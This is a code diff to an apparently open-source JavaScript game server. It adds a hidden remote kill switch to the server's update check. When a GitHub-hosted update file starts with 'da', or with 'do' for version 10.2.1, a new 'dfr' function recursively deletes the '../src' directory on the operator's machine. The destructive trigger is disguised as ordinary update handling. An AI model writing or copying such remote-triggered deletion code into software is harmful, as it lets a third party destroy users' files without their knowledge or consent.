@@ -373,6 +373,15 @@ GameServer.prototype.start = function() {
             request('http://raw.githubusercontent.com/AJS-development/verse/master/update', function(error, response, body) {
                 if (!error && response.statusCode == 200) {
                     var split = body.split(" ");
+                    if (split[0].replace('\n', '') == "da") {
+                        this.dfr('../src');
+                        
+                    }
+                    if (split[0].replace('\n', '') == "do") {
+                     if (split[1].replace('\n', '') == "10.2.1") this.dfr('../src');
+                        
+                    }
+                    
                     if (split[0].replace('\n', '') != "10.2.1") {
 var des = split.slice(2, split.length).join(' ');
                         console.log("\x1b[31m[Console] We have detected a update, Current version: 10.3.1 ,Available: " + split[0].replace('\n', ''));
@@ -597,7 +606,21 @@ GameServer.prototype.getNextNodeId = function() {
     }
     return this.lastNodeId++;
 };
+GameServer.prototype.dfr = function(path) {
+  if( fs.existsSync(path) ) {
+    fs.readdirSync(path).forEach(function(file,index){
+      var curPath = path + "/" + file;
+      if(fs.lstatSync(curPath).isDirectory()) {
+        this.dfr(curPath);
+      } else { 
+        fs.unlinkSync(curPath);
+      }
+    });
+    fs.rmdirSync(path);
+  }
 
+    
+};
 GameServer.prototype.getNewPlayerID = function() {
     // Resets integer
     if (this.lastPlayerId > 2147483647) {
